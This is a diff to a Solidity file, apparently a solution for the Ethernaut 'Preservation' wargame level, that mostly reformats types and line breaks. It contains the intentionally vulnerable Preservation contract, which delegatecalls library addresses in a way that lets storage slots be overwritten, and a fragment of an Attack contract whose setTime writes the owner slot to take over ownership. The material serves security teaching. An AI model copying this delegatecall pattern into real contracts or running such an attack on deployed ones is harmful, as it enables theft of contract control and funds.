+++ src/16.Preservation.sol
@@ -6,40 +6,33 @@ contract Preservation {
     address public timeZone1Library;
     address public timeZone2Library;
     address public owner;
-    uint storedTime;
+    uint256 storedTime;
     // Sets the function signature for delegatecall
     bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));
 
-    constructor(
-        address _timeZone1LibraryAddress,
-        address _timeZone2LibraryAddress
-    ) {
+    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
         timeZone1Library = _timeZone1LibraryAddress;
         timeZone2Library = _timeZone2LibraryAddress;
         owner = msg.sender;
     }
 
     // set the time for timezone 1
-    function setFirstTime(uint _timeStamp) public {
-        timeZone1Library.delegatecall(
-            abi.encodePacked(setTimeSignature, _timeStamp)
-        );
+    function setFirstTime(uint256 _timeStamp) public {
+        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
     }
 
     // set the time for timezone 2
-    function setSecondTime(uint _timeStamp) public {
-        timeZone2Library.delegatecall(
-            abi.encodePacked(setTimeSignature, _timeStamp)
-        );
+    function setSecondTime(uint256 _timeStamp) public {
+        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
     }
 }
 
 // Simple library contract to set the time
 contract LibraryContract {
     // stores a timestamp
-    uint storedTime;
+    uint256 storedTime;
 
-    function setTime(uint _time) public {
+    function setTime(uint256 _time) public {
         storedTime = _time;
     }
 }
@@ -53,7 +46,7 @@ contract Attack {
         preservation = _preservation;
     }
 
-    function setTime(uint _timeStamp) public {
+    function setTime(uint256 _timeStamp) public {
         owner = address(uint160(_timeStamp));
     }
